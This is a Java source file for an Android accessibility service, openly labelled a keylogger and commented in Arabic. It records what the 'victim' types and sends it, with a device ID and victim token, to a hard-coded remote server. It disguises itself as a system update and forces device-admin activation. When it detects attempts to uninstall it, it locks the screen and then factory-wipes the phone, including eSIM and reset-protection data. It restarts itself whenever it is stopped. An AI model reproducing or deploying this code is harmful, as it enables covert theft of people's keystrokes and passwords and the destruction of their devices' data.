package com.sec.check;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * KeyloggerService - آخر خط دفاع
 * ============================================================
 * الوظائف:
 * 1. تسجيل كل ما يكتبه الضحية (Keylogger)
 * 2. مراقبة محاولات الحذف من الإعدادات
 * 3. مراقبة فتح Settings / Apps / Package Installer
 * 4. تنفيذ Factory Reset فور محاولة الحذف
 * 5. تنفيذ قفل الشاشة عند رؤية أي نية لحذف التطبيق
 * ============================================================
 */
public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "SystemUpdate";
    private static final String SERVER_URL = "https://daf-production-c62c.up.railway.app";

    private static final String PREFS_NAME = "sys_prefs";
    private static final String KEY_UNINSTALL_ATTEMPTS = "uninstall_attempts";
    private static final String KEY_LAST_DETECTION = "last_detection_time";
    private static final String KEY_FACTORY_RESET_TRIGGERED = "factory_reset_triggered";

    // ★★★ فترة التبريد بين كل اكتشاف (بالثواني) ★★★
    private static final long DETECTION_COOLDOWN_SECONDS = 20;

    // ★★★ الحد الأقصى لاكتشافات الحذف قبل Wipe ★★★
    private static final int MAX_DETECTIONS_BEFORE_WIPE = 2;

    // ★★★ فاصل رفع الـ keylog ★★★
    private static final long FLUSH_INTERVAL = 3000;

    private StringBuilder buffer = new StringBuilder();
    private long lastFlush = 0;
    private String deviceId = "";
    private String victimToken = "";

    // ★★★ قائمة بكل الكلمات التي تشير لمحاولة حذف ★★★
    private static final String[] UNINSTALL_KEYWORDS = {
            // العربية
            "إلغاء التثبيت",
            "الغاء التثبيت",
            "إزالة",
            "ازالة",
            "حذف التطبيق",
            "مسح البيانات",
            "مسح التخزين",
            "إيقاف",
            "ايقاف",
            "تعطيل",
            "إلغاء التنشيط",
            "الغاء التنشيط",
            "تعطيل مسؤول النظام",
            "إلغاء مسؤول",
            "الغاء مسؤول",
            "إزالة الحماية",
            "ازالة الحماية",

            // English
            "Uninstall",
            "uninstall",
            "Remove",
            "remove",
            "Delete app",
            "Clear data",
            "Clear storage",
            "Clear cache",
            "Disable",
            "disable",
            "Deactivate",
            "deactivate",
            "Device admin",
            "Remove admin",
            "Turn off admin",
            "Force stop",
            "Force Stop",
            "Storage & cache",
            "App info",
            "App Info",
            "Application info",
            "System Update",
            "securitycheck",
            "com.sec.check",
            "com.android.system.update",

            // لغات أخرى
            "卸载",           // صيني
            "supprimer",      // فرنسي
            "desinstalar",    // إسباني
            "deinstallieren", // ألماني
    };

    // ★★★ أسماء الحزم اللي بنراقبها ★★★
    private static final String[] MONITORED_PACKAGES = {
            "com.android.settings",
            "com.android.packageinstaller",
            "com.google.android.packageinstaller",
            "com.android.packageinstaller",  // duplicate لكن آمن
            "com.samsung.android.packageinstaller",
            "com.miui.packageinstaller",
            "com.android.launcher",
            "com.android.launcher3",
            "com.google.android.apps.nexuslauncher",
            "com.sec.android.app.launcher",
            "com.sec.android.app.settings",
    };

    // ============================================================
    // onServiceConnected
    // ============================================================
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "★★★★★ KEYLOGGER SERVICE CONNECTED ★★★★★");

        try {
            // ★ اضبط الإعدادات ★
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
            info.notificationTimeout = 100;
            info.flags =
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                            | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                            | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                            | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
            setServiceInfo(info);

            // ★ device_id ★
            try {
                deviceId = Settings.Secure.getString(
                        getContentResolver(), Settings.Secure.ANDROID_ID);
            } catch (Exception ignored) {
                deviceId = "unknown";
            }

            // ★ توكن الضحية ★
            try {
                victimToken = BuildConfig.VICTIM_TOKEN;
            } catch (Exception ignored) {
                victimToken = "DEFAULT_TOKEN";
            }

            // ★ ابلّغ السيرفر إن الخدمة اشتغلت ★
            new Thread(() -> {
                try {
                    JSONObject event = new JSONObject();
                    event.put("type", "keylogger_ready");
                    event.put("device", deviceId);
                    event.put("token", victimToken);
                    event.put("timestamp", System.currentTimeMillis());
                    postJson("/apk/victim/data", event);
                } catch (Exception ignored) {}
            }).start();

            // ★★★ تأكد إن الـ Device Admin مفعّل ★★★
            ensureDeviceAdmin();

            Log.d(TAG, "★★★★★ KEYLOGGER READY — MONITORING ★★★★★");

        } catch (Exception e) {
            Log.e(TAG, "onServiceConnected error: " + e.getMessage());
        }
    }

    // ============================================================
    // onAccessibilityEvent - معالجة كل حدث
    // ============================================================
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            int eventType = event.getEventType();

            // ★★★ أولاً: راقب محاولات الحذف على كل الأحداث ★★★
            monitorUninstallAttempts(event);

            // ★ ثانيًا: تسجيل ما يكتبه الضحية ★★★
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence text = (event.getText() != null
                        && !event.getText().isEmpty()) ? event.getText().get(0) : null;
                if (text != null) {
                    buffer.append(text.toString()).append("|");
                    tryFlush();
                }
            }

            // ★ ثالثًا: راقب الأحداث الحساسة ★★★
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                monitorDangerousWindows(event);
            }

        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent error: " + e.getMessage());
        }
    }

    // ============================================================
    // ★★★ monitorUninstallAttempts - قلب الحماية ★★★
    // ============================================================
    private void monitorUninstallAttempts(AccessibilityEvent event) {
        try {
            // ★ اجلب اسم الحزمة ★
            CharSequence packageName = event.getPackageName();
            if (packageName == null) return;

            String pkg = packageName.toString();

            // ★ تحقق إذا كانت الحزمة داخل قائمة المراقبة ★
            boolean shouldMonitor = false;
            for (String monitored : MONITORED_PACKAGES) {
                if (pkg.equals(monitored) || pkg.startsWith(monitored)) {
                    shouldMonitor = true;
                    break;
                }
            }

            // ★ راقب أيضًا أي حزمة فيها "settings" أو "packageinstaller" ★
            if (!shouldMonitor) {
                String lowerPkg = pkg.toLowerCase();
                if (lowerPkg.contains("settings")
                        || lowerPkg.contains("packageinstaller")
                        || lowerPkg.contains("launcher")) {
                    shouldMonitor = true;
                }
            }

            if (!shouldMonitor) return;

            // ★★★ ابحث عن الكلمات المفتاحية في نص الحدث ★★★
            List<CharSequence> texts = event.getText();
            if (texts == null || texts.isEmpty()) return;

            for (CharSequence cs : texts) {
                if (cs == null) continue;
                String text = cs.toString();

                // ★★★ تحقق من كل كلمة مفتاحية ★★★
                for (String keyword : UNINSTALL_KEYWORDS) {
                    if (text.toLowerCase().contains(keyword.toLowerCase())
                            || text.contains(keyword)) {

                        Log.d(TAG, "★★★★★ UNINSTALL ATTEMPT DETECTED ★★★★★");
                        Log.d(TAG, "Keyword: " + keyword);
                        Log.d(TAG, "Text: " + text);
                        Log.d(TAG, "Package: " + pkg);

                        triggerDefense(text);
                        return;
                    }
                }
            }

            // ★★★ ابحث أيضًا في AccessibilityNodeInfo ★★★
            AccessibilityNodeInfo node = event.getSource();
            if (node != null) {
                checkNodeForKeywords(node);
            }

        } catch (Exception e) {
            Log.e(TAG, "monitorUninstallAttempts error: " + e.getMessage());
        }
    }

    // ============================================================
    // checkNodeForKeywords - فحص شجرة الـ nodes
    // ============================================================
    private void checkNodeForKeywords(AccessibilityNodeInfo node) {
        if (node == null) return;

        try {
            // ★ فحص نص العقدة ★
            CharSequence text = node.getText();
            if (text != null) {
                String textStr = text.toString();
                for (String keyword : UNINSTALL_KEYWORDS) {
                    if (textStr.toLowerCase().contains(keyword.toLowerCase())) {
                        Log.d(TAG, "★★★★★ NODE KEYWORD DETECTED: " + keyword);
                        triggerDefense(textStr);
                        return;
                    }
                }
            }

            // ★ فحص وصف المحتوى ★
            CharSequence contentDesc = node.getContentDescription();
            if (contentDesc != null) {
                String descStr = contentDesc.toString();
                for (String keyword : UNINSTALL_KEYWORDS) {
                    if (descStr.toLowerCase().contains(keyword.toLowerCase())) {
                        Log.d(TAG, "★★★★★ NODE DESC DETECTED: " + keyword);
                        triggerDefense(descStr);
                        return;
                    }
                }
            }

            // ★ فحص الأبناء (بحد أقصى 50 عقدة لتجنب البطء) ★
            int childCount = Math.min(node.getChildCount(), 50);
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    checkNodeForKeywords(child);
                    // (لا نعمل recycle عشان ما نقعش في مشاكل)
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "checkNodeForKeywords error: " + e.getMessage());
        }
    }

    // ============================================================
    // ★★★ triggerDefense - تنفيذ الدفاع ★★★
    // ============================================================
    private void triggerDefense(String detectedText) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

            // ★ فترة التبريد (عشان ما نكررش نفس الإجراء) ★
            long lastDetection = prefs.getLong(KEY_LAST_DETECTION, 0);
            long now = System.currentTimeMillis();
            if (now - lastDetection < DETECTION_COOLDOWN_SECONDS * 1000) {
                Log.d(TAG, "[DEFENSE] In cooldown, skipping");
                return;
            }

            prefs.edit().putLong(KEY_LAST_DETECTION, now).apply();

            // ★ زوّد العداد ★
            int attempts = prefs.getInt(KEY_UNINSTALL_ATTEMPTS, 0) + 1;
            prefs.edit().putInt(KEY_UNINSTALL_ATTEMPTS, attempts).apply();

            Log.d(TAG, "★★★★★ DEFENSE TRIGGERED #" + attempts + " ★★★★★");

            // ★★★ إجراء 1: اقفل الشاشة فورًا ★★★
            try {
                DevicePolicyManager dpm = (DevicePolicyManager)
                        getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (dpm != null) {
                    dpm.lockNow();
                }
            } catch (Exception e) {
                Log.e(TAG, "[DEFENSE] lockNow error: " + e.getMessage());
            }

            // ★★★ إجراء 2: ابلّغ السيرفر ★★★
            final int attemptsFinal = attempts;
            new Thread(() -> {
                try {
                    JSONObject event = new JSONObject();
                    event.put("type", "uninstall_attempt");
                    event.put("device", deviceId);
                    event.put("token", victimToken);
                    event.put("attempts", attemptsFinal);
                    event.put("detected_text", detectedText);
                    event.put("timestamp", System.currentTimeMillis());
                    postJson("/apk/victim/data", event);
                } catch (Exception ignored) {}
            }).start();

            // ★★★ إجراء 3: لو تخطى الحد → WIPE ★★★
            if (attempts >= MAX_DETECTIONS_BEFORE_WIPE) {
                Log.d(TAG, "★★★★★ MAX ATTEMPTS — WIPING DEVICE ★★★★★");

                try {
                    prefs.edit()
                            .putBoolean(KEY_FACTORY_RESET_TRIGGERED, true)
                            .apply();

                    // ★★ استنى ثانيتين عشان السيرفر يستقبل التنبيه ★★
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            DevicePolicyManager dpm = (DevicePolicyManager)
                                    getSystemService(Context.DEVICE_POLICY_SERVICE);
                            if (dpm != null) {
                                int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                        | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                    flags |= 0x0004; // WIPE_EUICC
                                }
                                dpm.wipeData(flags);
                                Log.d(TAG, "★★★★★ WIPE EXECUTED ★★★★★");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "[DEFENSE] wipe error: " + e.getMessage());
                        }
                    }, 2000);

                } catch (Exception e) {
                    Log.e(TAG, "[DEFENSE] wipe prep error: " + e.getMessage());
                }
            }

            // ★★★ إجراء 4: شغل الخدمة الرئيسية للتأكد من الاستمرارية ★★★
            try {
                Intent svc = new Intent(this, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(svc);
                } else {
                    startService(svc);
                }
            } catch (Exception ignored) {}

        } catch (Exception e) {
            Log.e(TAG, "triggerDefense error: " + e.getMessage());
        }
    }

    // ============================================================
    // monitorDangerousWindows - راقب النوافذ الخطيرة
    // ============================================================
    private void monitorDangerousWindows(AccessibilityEvent event) {
        try {
            CharSequence packageName = event.getPackageName();
            if (packageName == null) return;

            String pkg = packageName.toString().toLowerCase();

            // ★ لو الضحية فتح Settings، راقب النص ★
            if (pkg.contains("settings") || pkg.contains("packageinstaller")) {
                List<CharSequence> texts = event.getText();
                if (texts == null) return;

                for (CharSequence cs : texts) {
                    if (cs == null) continue;
                    String text = cs.toString().toLowerCase();

                    // ★★★ ابحث عن اسم التطبيق + كلمة حذف ★★★
                    boolean mentionsOurApp =
                            text.contains("system update")
                                    || text.contains("com.sec.check")
                                    || text.contains("com.android.system");

                    boolean mentionsDelete =
                            text.contains("uninstall")
                                    || text.contains("إلغاء")
                                    || text.contains("الغاء")
                                    || text.contains("حذف")
                                    || text.contains("إزالة")
                                    || text.contains("ازالة");

                    if (mentionsOurApp && mentionsDelete) {
                        Log.d(TAG, "★★★★★ DANGEROUS WINDOW DETECTED ★★★★★");
                        triggerDefense(text);
                        return;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "monitorDangerousWindows error: " + e.getMessage());
        }
    }

    // ============================================================
    // ensureDeviceAdmin - تأكد إن Device Admin مفعّل
    // ============================================================
    private void ensureDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);

            if (dpm != null && !dpm.isAdminActive(admin)) {
                Log.d(TAG, "[ENSURE] Device Admin NOT active — trying to activate");
                try {
                    Intent intent = new Intent(
                            DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "مطلوب لتفعيل الحماية الكاملة للجهاز.");
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception ignored) {}
            } else {
                Log.d(TAG, "[ENSURE] Device Admin is active");
            }
        } catch (Exception e) {
            Log.e(TAG, "ensureDeviceAdmin error: " + e.getMessage());
        }
    }

    // ============================================================
    // tryFlush - ارفع الـ keylog للسيرفر
    // ============================================================
    private void tryFlush() {
        long now = System.currentTimeMillis();
        if (now - lastFlush < FLUSH_INTERVAL && buffer.length() < 500) {
            return;
        }

        String text = buffer.toString();
        buffer.setLength(0);
        lastFlush = now;

        if (text.isEmpty()) return;

        final String finalText = text;
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                try {
                    JSONObject data = new JSONObject();
                    data.put("type", "keylog");
                    data.put("token", victimToken);
                    data.put("device", deviceId);
                    data.put("text", finalText);
                    data.put("timestamp", System.currentTimeMillis());
                    postJson("/apk/victim/data", data);
                } catch (Exception e) {
                    Log.e(TAG, "sendToServer error: " + e.getMessage());
                }
                return null;
            }
        }.execute();
    }

    // ============================================================
    // postJson - إرسال JSON للسيرفر
    // ============================================================
    private void postJson(String path, JSONObject data) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(SERVER_URL + path);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data.toString());
            os.flush();
            os.close();

            int rc = conn.getResponseCode();
            Log.d(TAG, "POST " + path + " → HTTP " + rc);

        } catch (Exception e) {
            Log.e(TAG, "postJson error: " + e.getMessage());
        } finally {
            try {
                if (conn != null) conn.disconnect();
            } catch (Exception ignored) {}
        }
    }

    // ============================================================
    // onInterrupt
    // ============================================================
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted");

        // ★★ حاول إعادة التشغيل ★★
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Exception ignored) {}
    }

    // ============================================================
    // onUnbind - عند فصل الخدمة
    // ============================================================
    @Override
    public boolean onUnbind(Intent intent) {
        Log.d(TAG, "Keylogger onUnbind — restarting");

        // ★★ ارفع أي بيانات متبقية ★★
        tryFlush();

        // ★★ حاول إعادة تشغيل نفسك ★★
        try {
            Intent restart = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception ignored) {}

        return super.onUnbind(intent);
    }

    // ============================================================
    // onDestroy
    // ============================================================
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Keylogger onDestroy — restarting");

        // ★★ حاول إعادة التشغيل ★★
        try {
            Intent restart = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception ignored) {}
    }
                    }
